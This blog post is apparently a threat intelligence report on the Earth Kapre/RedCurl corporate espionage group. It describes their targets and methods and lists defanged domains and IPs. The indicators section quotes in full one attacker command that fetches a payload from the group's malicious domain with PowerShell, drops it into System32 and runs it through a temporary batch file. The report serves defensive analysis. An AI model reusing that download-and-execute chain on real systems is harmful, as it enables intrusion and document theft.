---
title: TLP WHITE:
url: https://krypt3ia.wordpress.com/2024/03/17/tlp-white/
source: Krypt3ia
date: 2024-03-18
fetch_date: 2025-10-04T12:08:28.194909
---

# TLP WHITE:

# [Krypt3ia](https://krypt3ia.wordpress.com/)

(Greek: κρυπτεία / krupteía, from κρυπτός / kruptós, “hidden, secret things”)

## TLP WHITE:

[leave a comment »](https://krypt3ia.wordpress.com/2024/03/17/tlp-white/#respond)

# Technical Threat Intelligence Report on Earth Kapre/RedCurl

#### Overview

Earth Kapre, also known as RedCurl, is a sophisticated cyberespionage group that has been active since at least November 2018. This group primarily targets corporate espionage, focusing on document theft from organizations across various sectors, including construction, finance, consulting, retail, insurance, and legal sectors. Their activities span several countries, notably the U.K., Germany, Canada, Norway, Russia, and Ukraine.

#### Tactics, Techniques, and Procedures (TTPs)

Earth Kapre/RedCurl employs a blend of custom malware and publicly available hacking tools to infiltrate target networks and exfiltrate sensitive information. Unlike many cybercriminal groups, they do not rely on ransomware or direct financial theft but instead aim to steal internal corporate documents, such as staff records, court files, and enterprise email histories. The group demonstrates exceptional red teaming skills and a keen ability to bypass traditional antivirus solutions.

Their operational timeline within a target’s network can range from two to six months from initial infection to the final stage of data theft. Their modus operandi deviates from typical cybercriminal activities by avoiding the deployment of backdoors or the use of popular post-exploitation frameworks like CobaltStrike and Meterpreter. Instead, they focus on maintaining a low profile to avoid detection while gathering valuable information.

#### Indicators of Compromise (IoCs)

One of their known IoCs includes the use of the domain “preston[.]melaniebest[.]com” for downloading malicious payloads, including custom versions of “curl.exe” and other utilities designed for data extraction and system manipulation. Their methodology involves sophisticated command execution sequences and registry modifications to establish persistence and evade detection.

The group also utilizes scheduled tasks for persistence and leverages common system tools in unconventional ways to execute their payloads and maintain access to compromised systems. Observations from Trend Micro MDR Threat Intelligence reveal the use of the “curl” command to fetch and execute malicious payloads, further underscoring their preference for stealth and sophistication over brute force.

1. **Malicious Domain and IP Addresses:**

* `preston.melaniebest[.]com`
* IP addresses associated with malicious activities:
  + `23[.]254[.]224[.]79`
  + `198[.]252[.]101[.]86`

1. **Malware File Hashes:**

* While specific hashes were not provided in the document, any file downloaded from the listed malicious domains or IP addresses should be considered suspicious and analyzed for potential threats.

1. **Malicious Commands and Scripts:**

* Use of `curl.exe` to download malicious payloads:
  + Example command: `%COMSPEC% /Q /c echo powershell -c "iwr -Uri http://preston[.]melaniebest[.]com/ms/curl.tmp -OutFile C:\Windows\System32\curl.exe -UseBasicParsing" > \\127.0.0.1\C$\dvPqyh 2^>^&1 > %TEMP%\KzIMnc.bat & %COMSPEC% /Q /c %TEMP%\KzIMnc.bat & %COMSPEC% /Q /c del %TEMP%\KzIMnc.bat`
* Downloading and executing other tools like `7za.exe` for unpacking or manipulating files.

1. **Registry Keys for Persistence:**

* Registry modifications for persistence were outlined, involving services with unusual names and commands for execution stored within the `imagepath`.

1. **Network Signatures:**

* Suspicious network connection checks, such as using `netstat` to verify if port 4419 is open, indicating potential communication with C2 servers or exfiltration attempts.

1. **Scheduled Tasks for Execution:**

* Execution of scheduled tasks, often with names mimicking legitimate Windows tasks but linked to malicious activities.

1. **Use of Impacket:**

* Evidence of Impacket-related services in the registry, indicating the use of this toolset for network protocol attacks and lateral movement within compromised networks.

#### Infrastructure and Victimology

Earth Kapre/RedCurl’s infrastructure includes a variety of compromised servers used for hosting their malicious payloads and command and control activities. Their victimology spans a broad range of sectors, with a notable focus on companies that possess valuable corporate and legal documents.

The group’s success and continued evolution suggest a trend toward more corporate-focused cyberespionage activities, potentially inspiring other cybercriminal entities to adopt similar tactics.

#### Conclusion

Earth Kapre/RedCurl represents a significant threat to corporations worldwide, with a unique focus on stealthy exfiltration of sensitive information rather than direct financial gain. Their sophisticated use of custom malware, combined with the strategic use of publicly available tools, makes them a formidable adversary. Organizations are advised to adopt a proactive security posture, including advanced threat detection and response capabilities, to mitigate the risk posed by such advanced persistent threats.

For more detailed information and updates on Earth Kapre/RedCurl, please refer to the comprehensive report by Trend Micro MDR Threat Intelligence.

Executive Briefing Document:

[executive-threat-intel-report-redcurl](https://krypt3ia.wordpress.com/wp-content/uploads/2024/03/executive-threat-intel-report-redcurl.pdf)[Download](https://krypt3ia.wordpress.com/wp-content/uploads/2024/03/executive-threat-intel-report-redcurl.pdf)

Threat Report: Intersection of Criminal Groups and Industrial Espionage

[intersection-of-criminal-groups-and-industrial-espionage](https://krypt3ia.wordpress.com/wp-content/uploads/2024/03/intersection-of-criminal-groups-and-industrial-espionage.pdf)[Download](https://krypt3ia.wordpress.com/wp-content/uploads/2024/03/intersection-of-criminal-groups-and-industrial-espionage.pdf)

### Rate this:

### Share this:

* [Click to share on Facebook (Opens in new window)
  Facebook](https://krypt3ia.wordpress.com/2024/03/17/tlp-white/?share=facebook)
* [Click to share on X (Opens in new window)
  X](https://krypt3ia.wordpress.com/2024/03/17/tlp-white/?share=x)
* [Click to share on Reddit (Opens in new window)
  Reddit](https://krypt3ia.wordpress.com/2024/03/17/tlp-white/?share=reddit)

Like Loading...

### *Related*

Written by Krypt3ia

2024/03/17 at 14:35

Posted in [Advanced Persistent Threat](https://krypt3ia.wordpress.com/category/advanced-persistent-threat/), [Espionage](https://krypt3ia.wordpress.com/category/espionage/), [Industrial Espionage](https://krypt3ia.wordpress.com/category/industrial-espionage/), [Russia](https://krypt3ia.wordpress.com/category/russia/), [Threat Assessment](https://krypt3ia.wordpress.com/category/threat-assessment/), [Threat Intel](https://krypt3ia.wordpress.com/category/threat-intel/), [Threat Intelligence](https://krypt3ia.wordpress.com/category/threat-intelligence/)

« [Complexity in Networks and Systems: Analyzing the Intersection of Human Influence and Vulnerability Exploitation](https://krypt3ia.wordpress.com/2024/03/17/complexity-in-networks-and-systems-analyzing-the-intersection-of-human-influence-and-vulnerability-exploitation/)

[A Critical Look at “Cyber security is a dark art”: The CISO as soothsayer](https://krypt3ia.wordpress.com/2024/03/18/a-critical-look-at-cyber-security-is-a-dark-art-the-ciso-as-soothsayer/) »

### Leave a comment

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

### Blog Stats

* 1,348,495 hits

March 2024

| M | T | W | T | F | S | S |
| --- | --- | --- | --- | --- | --- | --- |
|  | | | | [1](https://krypt3ia.wordpress.com/2024/03/01/) | 2 | 3 |
| [4](https://krypt3ia.wordpress.com/2024/03/04/) | 5 | [6](https://krypt3ia.wordpress.com/2024/03/06/) | [7](htt...